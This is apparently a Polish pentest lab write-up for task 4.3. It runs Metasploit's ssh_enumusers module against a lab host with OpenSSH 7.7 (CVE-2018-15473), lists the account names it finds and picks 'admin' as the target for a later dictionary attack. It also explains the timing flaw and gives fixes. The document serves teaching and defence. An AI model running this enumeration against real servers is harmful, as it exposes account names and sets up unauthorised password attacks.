# Zadanie 4.3 — SSH User Enumeration (CVE-2018-15473) na `10.10.10.11`

> **Cel:** wyliczyć istniejące konta użytkowników na serwerze SSH **bez
> logowania**, wykorzystując podatność OpenSSH < 7.8 na enumerację po czasie
> odpowiedzi (host `.11` to OpenSSH 7.7 — patrz 4.2).

| | |
|---|---|
| **Cel** | `10.10.10.11:22` (OpenSSH 7.7) |
| **Moduł** | `auxiliary/scanner/ssh/ssh_enumusers` |
| **CVE** | CVE-2018-15473 (User enumeration, dotyczy OpenSSH < 7.8) |
| **Słownik** | `/usr/src/metasploit-framework/data/wordlists/unix_users.txt` |

## Uruchomienie
```
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 10.10.10.11
set USER_FILE /usr/src/metasploit-framework/data/wordlists/unix_users.txt
run
```

> **Uwaga o ścieżce:** domyślna `/usr/share/wordlists/metasploit/unix_users.txt`
> nie istnieje w tym obrazie (`OptionValidateError`). Właściwą znalazłem przez:
> ```bash
> sudo docker exec metasploit find / -name "unix_users.txt" 2>/dev/null
> # -> /usr/src/metasploit-framework/data/wordlists/unix_users.txt
> ```

## Wynik
```
[*] 10.10.10.11:22 - SSH - Using malformed packet technique
[*] 10.10.10.11:22 - SSH - Checking for false positives
[+] 10.10.10.11:22 - SSH - User 'admin' found      <-- niestandardowy!
[+] 10.10.10.11:22 - SSH - User 'root' found
[+] 10.10.10.11:22 - SSH - User 'backup' found
[+] ... (bin, daemon, games, gnats, irc, list, lp, mail, man,
         news, nobody, proxy, sync, sys, uucp, www-data, _apt)
[*] Scanned 1 of 1 hosts (100% complete)
```

![ssh_enumusers → znaleziony admin + konta systemowe](screeny/01_ssh_enumusers_admin.png)

## Najważniejsza obserwacja
Większość trafień to **standardowe konta systemowe** Debiana/Ubuntu
(`root`, `daemon`, `www-data`…), które są na każdej maszynie. Wyróżnia się
**`admin`** — konto *nie* tworzone domyślnie, więc zostało dodane celowo przez
administratora. To **pierwszy kandydat do ataku słownikowego** w zad. 4.4.

## Na czym polega błąd (CVE-2018-15473)
Moduł wysyła **spreparowany (malformed) pakiet** uwierzytelniający. W OpenSSH
< 7.8:
- dla **istniejącego** użytkownika serwer liczy pełny hash hasła → odpowiada
  **wolniej**,
- dla **nieistniejącego** odrzuca żądanie od razu → **szybciej**.

Mierząc czas odpowiedzi, atakujący odróżnia konta istniejące od nieistniejących
— bez próby logowania i bez wpisów w logach o nieudanym haśle. `Checking for
false positives` kalibruje próg czasowy, by uniknąć fałszywych trafień.

## Jak naprawić
- Zaktualizować OpenSSH do **≥ 7.8** (ujednolicony czas odpowiedzi).
- Ograniczyć dostęp do portu 22 (firewall, VPN, allowlista IP).
- `AllowUsers`/`AllowGroups` + wyłączenie logowania `root` (`PermitRootLogin no`).
